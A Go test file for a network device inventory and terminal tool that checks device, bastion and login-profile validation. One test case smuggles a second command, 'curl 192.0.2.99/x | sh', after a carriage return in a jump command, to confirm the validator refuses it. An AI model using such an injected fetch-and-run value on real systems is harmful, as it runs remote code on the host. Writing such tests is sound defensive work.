package model

import (
	"strings"
	"testing"

	"github.com/kojio145/palaterm/internal/profile"
)

func labDevice() Device {
	return Device{Name: "lab-sw1", Host: "192.0.2.10", Conn: ConnSSH, Username: "ops", Enabled: true}
}

// Control characters in the labels (log file names, one line on screen)
// and in a jump command (typed on the hop's shell as it is) are refused.
func TestValidateRefusesControlCharacters(t *testing.T) {
	cases := []struct {
		name string
		mut  func(*Device)
		want string
	}{
		{"name", func(d *Device) { d.Name = "lab-sw1\nx" }, "名前に制御文字"},
		{"group", func(d *Device) { d.Group = "lab\rx" }, "グループに制御文字"},
		{"site", func(d *Device) { d.Site = "dc1\tx" }, "拠点に制御文字"},
		{"role", func(d *Device) { d.Role = "core\x1bx" }, "役割に制御文字"},
		{"jump command", func(d *Device) {
			d.Bastions = []Bastion{{Host: "192.0.2.9", Method: BastionSSH, Username: "ops", JumpCommand: "ssh {user}@{host}\rcurl 192.0.2.99/x | sh"}}
		}, "踏み台1段目のジャンプコマンドに制御文字"},
	}
	for _, tc := range cases {
		d := labDevice()
		tc.mut(&d)
		err := d.Validate()
		if err == nil || !strings.Contains(err.Error(), tc.want) {
			t.Errorf("%s: err = %v, want %q", tc.name, err, tc.want)
		}
	}
	if err := ValidateMyBastions([]Bastion{{Host: "192.0.2.9", Method: BastionSSH, Username: "ops", JumpCommand: "ssh x\ry"}}); err == nil || !strings.Contains(err.Error(), "自分の踏み台1段目のジャンプコマンドに制御文字") {
		t.Errorf("my bastion jump command: %v", err)
	}
	d := labDevice()
	d.Bastions = []Bastion{{Host: "192.0.2.9", Method: BastionSSH, Username: "ops", JumpCommand: "ssh -l {user} {host}"}}
	if err := d.Validate(); err != nil {
		t.Errorf("a plain jump command: %v", err)
	}
}

// An auth method the session does not know ("pubkey") used to fall back to
// password authentication at run time; now the device and each hop say so.
func TestValidateAuthMethod(t *testing.T) {
	d := labDevice()
	d.AuthMethod = "pubkey"
	if err := d.Validate(); err == nil || !strings.Contains(err.Error(), "認証方式が不正です") {
		t.Errorf("device: %v", err)
	}
	d = labDevice()
	d.Bastions = []Bastion{{Host: "192.0.2.9", Method: BastionSSH, Username: "ops", AuthMethod: "公開鍵認証"}}
	if err := d.Validate(); err == nil || !strings.Contains(err.Error(), "踏み台1段目の認証方式が不正です") {
		t.Errorf("hop: %v", err)
	}
	for _, m := range []AuthMethod{"", AuthPassword, AuthPublicKey} {
		d = labDevice()
		d.AuthMethod = m
		d.Bastions = []Bastion{{Host: "192.0.2.9", Method: BastionSSH, Username: "ops", AuthMethod: m}}
		if err := d.Validate(); err != nil {
			t.Errorf("%q: %v", m, err)
		}
	}
}

// More than MaxBastions hops (the API has no page to stop at) is refused.
func TestValidateCapsBastions(t *testing.T) {
	d := labDevice()
	for i := 0; i <= MaxBastions; i++ {
		d.Bastions = append(d.Bastions, Bastion{Host: "192.0.2.9", Method: BastionSSH, Username: "ops"})
	}
	if err := d.Validate(); err == nil || !strings.Contains(err.Error(), "踏み台は 5 段までです") {
		t.Errorf("6 hops: %v", err)
	}
	d.Bastions = d.Bastions[:MaxBastions]
	if err := d.Validate(); err != nil {
		t.Errorf("5 hops: %v", err)
	}
}

// BadNumber (a CSV cell that is no number) is named as such, not as "-1 out
// of range".
func TestValidateNamesBadNumbers(t *testing.T) {
	d := labDevice()
	d.Port = BadNumber
	if err := d.Validate(); err == nil || err.Error() != "ポート番号が数字ではありません" {
		t.Errorf("port: %v", err)
	}
	d = labDevice()
	d.GUIPort = BadNumber
	if err := d.Validate(); err == nil || err.Error() != "GUIポートが数字ではありません" {
		t.Errorf("gui port: %v", err)
	}
	d = Device{Name: "lab-con1", Conn: ConnSerial, Baud: BadNumber}
	if err := d.Validate(); err == nil || err.Error() != "ボーレートが数字ではありません" {
		t.Errorf("baud: %v", err)
	}
	d = labDevice()
	d.Bastions = []Bastion{{Host: "192.0.2.9", Method: BastionSSH, Username: "ops", Port: BadNumber}}
	if err := d.Validate(); err == nil || err.Error() != "踏み台1段目のポート番号が数字ではありません" {
		t.Errorf("hop port: %v", err)
	}
}

// A group that exists but has no default credentials (one a bundle import
// created without them) leaves the device's own login in place, like a
// deleted group does.
func TestResolveCredentialsGroupWithoutCreds(t *testing.T) {
	inv := &Inventory{
		DeviceGroups: []DeviceGroup{{Name: "lab"}, {Name: "lab2", Username: "gu", Password: "gp"}},
		Devices: []Device{
			{Name: "lab-sw1", Group: "lab", UseGroupCreds: true, Username: "du", Password: "dp", EnablePassword: "de"},
			{Name: "lab-sw2", Group: "lab2", UseGroupCreds: true, Username: "du", Password: "dp"},
		},
	}
	if r := inv.ResolveCredentials(inv.Devices[0]); r.Username != "du" || r.Password != "dp" || r.EnablePassword != "de" {
		t.Errorf("group without credentials emptied the login: %q %q %q", r.Username, r.Password, r.EnablePassword)
	}
	if r := inv.ResolveCredentials(inv.Devices[1]); r.Username != "gu" || r.Password != "gp" || r.EnablePassword != "" {
		t.Errorf("group with credentials: %q %q %q", r.Username, r.Password, r.EnablePassword)
	}
}

// Profile patterns are capped like the list-import rules' regexps, and a
// {password}/{enable} step without an Expect is refused.
func TestCheckProfileSendsCaps(t *testing.T) {
	base := profile.Profile{Name: "LabOS", Prompt: "#", Login: []profile.Step{{Expect: "assword:", Send: "{password}"}}}
	if err := CheckProfileSends(base); err != nil {
		t.Fatalf("plain profile: %v", err)
	}
	p := base
	p.Prompt = strings.Repeat("a", 501)
	if err := CheckProfileSends(p); err == nil || !strings.Contains(err.Error(), "長すぎます") {
		t.Errorf("long prompt: %v", err)
	}
	// Short but huge once compiled (Go itself refuses nested repeats past
	// 1000, so twelve a{1000} in a row).
	huge := strings.Repeat("a{1000}", 12)
	p = base
	p.MorePrompt = huge
	if err := CheckProfileSends(p); err == nil || !strings.Contains(err.Error(), "複雑すぎます") {
		t.Errorf("huge more prompt: %v", err)
	}
	p = base
	p.Login = []profile.Step{{Expect: huge, Send: "x"}}
	if err := CheckProfileSends(p); err == nil || !strings.Contains(err.Error(), "待つ文字列が複雑すぎます") {
		t.Errorf("huge expect: %v", err)
	}
	p = base
	p.Login = []profile.Step{{Send: "{password}"}}
	if err := CheckProfileSends(p); err == nil || !strings.Contains(err.Error(), "ログイン手順 1 は {password}/{enable} を待つ文字列なしで送ります") {
		t.Errorf("unconditional password: %v", err)
	}
	p = base
	p.Disconnect = []profile.Step{{Expect: " ", SendRaw: "{enable}\r"}}
	if err := CheckProfileSends(p); err == nil || !strings.Contains(err.Error(), "切断手順 1") {
		t.Errorf("unconditional enable (raw): %v", err)
	}
}

// SecretSteps lists a password sent to anything but a password prompt.
func TestSecretSteps(t *testing.T) {
	p := profile.Profile{Name: "LabOS", Prompt: "#", Login: []profile.Step{
		{Expect: "sername:", Send: "{password}"},
		{Expect: "assword:", Send: "{password}"},
		{Expect: "Secret:", Send: "{enable}"},
		{Expect: "パスワード:", Send: "{enable}"},
		{Expect: "#", Send: "{enable}"},
		{Expect: ">", Send: "enable"},
	}}
	got := SecretSteps(p)
	want := []string{"ログイン手順 1: 「sername:」 → {password}", "ログイン手順 5: 「#」 → {enable}"}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Errorf("SecretSteps = %q, want %q", got, want)
	}
}
